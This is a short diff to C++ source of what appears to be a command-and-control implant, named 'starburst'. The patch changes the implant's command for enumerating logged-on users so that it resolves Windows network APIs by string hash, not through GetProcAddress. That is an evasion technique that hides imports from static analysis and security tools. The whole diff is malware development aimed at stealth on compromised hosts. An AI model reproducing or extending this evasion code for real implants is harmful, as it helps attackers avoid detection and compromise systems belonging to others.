@@ -35,11 +35,11 @@ auto declfn starburst::cmd_net_loggedon(
     }
 
     auto pNetWkstaUserEnum = reinterpret_cast<fn_NetWkstaUserEnum>(
-        inst.kernel32.GetProcAddress( h_netapi,
-            symbol<LPCSTR>( "NetWkstaUserEnum" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_netapi ),
+            expr::hash_string( "NetWkstaUserEnum" ) ) );
     auto pNetApiBufferFree = reinterpret_cast<fn_NetApiBufferFree>(
-        inst.kernel32.GetProcAddress( h_netapi,
-            symbol<LPCSTR>( "NetApiBufferFree" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_netapi ),
+            expr::hash_string( "NetApiBufferFree" ) ) );
     if ( !pNetWkstaUserEnum || !pNetApiBufferFree ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
